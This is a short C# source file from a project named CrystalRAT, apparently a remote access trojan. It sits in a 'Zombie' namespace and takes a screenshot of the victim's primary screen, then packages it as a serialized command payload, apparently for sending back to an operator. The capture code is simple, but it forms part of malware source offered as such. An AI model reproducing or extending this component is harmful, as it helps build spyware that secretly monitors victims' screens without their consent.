using CrystalRATShared.Commands;
using CrystalRATShared.Serialization;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Zombie.Functions
{
    public static class Screenshot
    {

        public static byte[] Take()
        {
            byte[] img;

            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                              Screen.PrimaryScreen.Bounds.Height,
                              PixelFormat.Format32bppArgb);

            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);


            using (MemoryStream ms = new MemoryStream())
            {
                bmpScreenshot.Save(ms, ImageFormat.Jpeg);
                img = ms.ToArray();
            }
            return CommandDataSerializer.Serialize(CommandFlags.Screenshot, (writer) => { writer.Write(img); });

        }

    }
}
